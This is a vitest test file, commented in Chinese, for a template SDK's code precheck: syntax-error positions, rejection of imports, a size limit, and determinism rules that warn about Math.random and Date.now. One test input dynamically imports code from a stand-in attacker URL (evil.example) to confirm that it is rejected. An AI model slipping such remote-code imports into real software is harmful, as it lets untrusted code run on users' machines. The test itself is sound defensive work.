// T-DEV-2（静态部分）：源码预检的 compile 诊断带位置；确定性的静态规则（H12）只看语法树，带位置，
// 不因字符串和注释误报；安装校验把规则的结果并进 nondeterministic 警告，具体位置记进元数据。
// 运行时的部分（setup/update 抛错、看门狗、开发构建的拦截、双渲比对）在 tests/engine/T-DEV-2.spec.ts。
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { TemplateDiagnosticSchema } from '../../packages/template-sdk/src/index';
import { analyzeTemplateCode, checkDeterminismRules, positionOf, TemplateCodeError } from '../../apps/desktop/src/shared/template-code';
import type { TemplateService } from '../../apps/desktop/src/main/templates/service';
import { BASE_CODE, basePackage, buildBuiltins, makeService, writePackage } from './helpers/template-fixtures';

const rules = (code: string) => checkDeterminismRules(code).map((d) => `${d.code}@${d.line}:${d.column}`);

async function compileError(code: string) {
  try {
    await analyzeTemplateCode(code);
  } catch (error) {
    expect(error).toBeInstanceOf(TemplateCodeError);
    return (error as TemplateCodeError).diagnostic;
  }
  throw new Error('expected a compile error');
}

describe('T-DEV-2 源码预检（compile 诊断）', () => {
  it('语法错误带行列（从 1 开始），诊断合 schema', async () => {
    const d = await compileError('export default {\n  setup() {\n    return {;\n  },\n};\n');
    expect(d).toMatchObject({ kind: 'compile', severity: 'error', code: 'syntax-error', line: 3, column: 13 });
    expect(TemplateDiagnosticSchema.parse(d)).toEqual(d);
  });

  it('CRLF 换行也按行数', async () => {
    const d = await compileError('export default {\r\n  setup() {\r\n    return 1 +;\r\n  },\r\n};\r\n');
    expect(d).toMatchObject({ code: 'syntax-error', line: 3, column: 15 });
  });

  it('import 被拒绝，位置指向 import', async () => {
    expect(await compileError(`// x\nimport x from 'three';\n${BASE_CODE}`)).toMatchObject({ code: 'has-import', line: 2, column: 1 });
    expect(await compileError(`${BASE_CODE}\nconst m = import('https://evil.example/x.js');`)).toMatchObject({ code: 'has-import', line: 13, column: 11 });
  });

  it('超过 1 MB：too-large（没有位置）', async () => {
    const d = await compileError(`${BASE_CODE}//${'x'.repeat(1024 * 1024)}`);
    expect(d).toEqual({ kind: 'compile', severity: 'error', code: 'too-large', message: 'template code exceeds 1 MB' });
  });

  it('合法的模板没有诊断', async () => {
    expect(await analyzeTemplateCode(BASE_CODE)).toEqual([]);
  });

  it('positionOf：列按 UTF-16 码元', () => {
    expect(positionOf('ab\ncd', 4)).toEqual({ line: 2, column: 2 });
    expect(positionOf('中文\n😀x', 5)).toEqual({ line: 2, column: 3 });
  });
});

describe('H12 确定性的静态规则', () => {
  it('拦 Math.random、Date.now、new Date()、Date()、performance.now，位置指向表达式开头', () => {
    const code = [
      'export default {',
      '  setup(ctx) {',
      '    const a = Math.random();',
      "    const b = Math['random'];",
      '    const c = Date.now();',
      '    const d = new Date();',
      '    const e = Date();',
      '    const f = performance.now();',
      '    return { duration: 1, update() { void [a, b, c, d, e, f, ctx]; } };',
      '  },',
      '};',
    ].join('\n');
    expect(rules(code)).toEqual(['math-random@3:15', 'math-random@4:15', 'date-now@5:15', 'new-date@6:15', 'new-date@7:15', 'performance-now@8:15']);
    for (const d of checkDeterminismRules(code)) expect(d).toMatchObject({ kind: 'rule', severity: 'warning' });
  });

  it('不因字符串、注释、模板字符串、对象属性名误报；new Date(0) 是确定的', () => {
    const code = [
      '// Math.random() Date.now() performance.now() import("x")',
      '/* new Date() */',
      "const s = 'Math.random()' + \"Date.now()\" + `performance.now() ${1}`;",
      'const o = { random: 1, now: 2, Math: 3 };',
      'const fixed = new Date(0);',
      'const r = ctxLike.random("a").next();',
      'export default { setup() { void [s, o, fixed, r]; return { duration: 1, update() {} }; } };',
    ].join('\n');
    expect(rules(code)).toEqual([]);
  });

  it('import 也是一条规则（安装、装载时它是硬错误，这里是给编辑器的提示）', () => {
    expect(rules("import x from 'y';\nexport * from 'z';\nexport default { setup() { return import('w'); } };")).toEqual(['import@1:1', 'import@2:1', 'import@3:35']);
  });

  it('语法错误时规则检查返回空（语法错误由预检报）', () => {
    expect(checkDeterminismRules('export default {')).toEqual([]);
  });

  it('analyzeTemplateCode 在预检通过时返回规则提示', async () => {
    const code = BASE_CODE.replace('update() {}', 'update() { void Math.random(); }');
    expect((await analyzeTemplateCode(code)).map((d) => d.code)).toEqual(['math-random']);
  });
});

describe('H12 安装校验并入警告', () => {
  let root: string;
  let svc: TemplateService;

  beforeAll(async () => {
    root = mkdtempSync(join(tmpdir(), 'allay-dev-rules-'));
    await buildBuiltins(join(root, 'builtin'));
    svc = await makeService(join(root, 'user'), join(root, 'builtin'));
  }, 60_000);

  afterAll(() => rmSync(root, { recursive: true, force: true }));

  it('用了 Math.random 的模板仍可安装，警告里有 nondeterministic，元数据记下位置', async () => {
    const code = BASE_CODE.replace('update() {}', 'update(t) { void (Math.random() * t); }');
    const staged = await svc.stage(writePackage(join(root, 'in', 'random.allaytpl'), basePackage({ id: 'user.test.random' }, { 'template.js': code })));
    if (!('ok' in staged) || !staged.ok) throw new Error(JSON.stringify(staged));
    expect(staged.ruleDiagnostics).toMatchObject([{ kind: 'rule', code: 'math-random', line: 9, column: 59 }]);
    // 渲染进程交来的试运行警告里没有它：主进程自己并进去
    const committed = await svc.commit(staged.stagingId, { warnings: [] });
    expect(committed).toMatchObject({ ok: true, entry: { trialWarnings: ['nondeterministic'] } });
    const meta = JSON.parse(readFileSync(join(root, 'user', 'templates', 'user.test.random', '1.2.0.meta.json'), 'utf8')) as { ruleDiagnostics: unknown[] };
    expect(meta.ruleDiagnostics).toMatchObject([{ code: 'math-random', line: 9 }]);
  });

  it('没问题的模板不加警告；试运行已报的 nondeterministic 不重复', async () => {
    const ok = await svc.stage(writePackage(join(root, 'in', 'ok.allaytpl'), basePackage({ id: 'user.test.clean' })));
    if (!('ok' in ok) || !ok.ok) throw new Error(JSON.stringify(ok));
    expect(ok.ruleDiagnostics).toEqual([]);
    expect(await svc.commit(ok.stagingId, { warnings: [] })).toMatchObject({ ok: true, entry: { trialWarnings: [] } });

    const code = BASE_CODE.replace('update() {}', 'update() { void Date.now(); }');
    const both = await svc.stage(writePackage(join(root, 'in', 'both.allaytpl'), basePackage({ id: 'user.test.both' }, { 'template.js': code })));
    if (!('ok' in both) || !both.ok) throw new Error(JSON.stringify(both));
    expect(await svc.commit(both.stagingId, { warnings: ['nondeterministic'] })).toMatchObject({ ok: true, entry: { trialWarnings: ['nondeterministic'] } });
  });

  it('语法错误的包被拒绝（code-syntax），错误里带位置', async () => {
    const r = await svc.stage(writePackage(join(root, 'in', 'bad.allaytpl'), basePackage({ id: 'user.test.bad' }, { 'template.js': 'export default {\n  setup() { return ; }\n  oops\n};\n' })));
    expect(r).toMatchObject({ ok: false, error: { code: 'code-syntax', diagnostic: { kind: 'compile', code: 'syntax-error', line: 3, column: 3 } } });
  });
});
